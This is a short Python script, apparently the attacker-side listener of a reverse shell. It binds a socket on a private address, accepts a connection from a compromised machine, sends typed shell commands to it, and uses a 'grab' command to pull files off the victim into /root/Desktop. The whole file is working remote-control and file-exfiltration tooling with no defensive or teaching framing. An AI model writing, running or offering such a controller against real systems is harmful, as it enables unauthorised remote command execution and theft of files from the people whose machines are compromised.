import socket

def transfer(conn,command):
    conn.send(command.encode())
    grab,path = command.split("*")
    f = open("/root/Desktop/"+path,"wb")
    while True:
        bits = conn.recv(1024)
        if bits.endswith("DONE".encode()):
            f.write(bits[:-4])
            f.close()
            print("transfer completed")
            break
        if 'file not found' in bits:
            print("unable to find the file")
        f.write(bits)
def connect():
    s = socket.socket()
    s.bind(("192.168.42.85",8080))
    s.listen(1)
    conn,addr = s.accept()
    print("we gotta a connection from: ",addr)
    while True:
        command = input("shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn,command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())
def main():
    connect()
main()
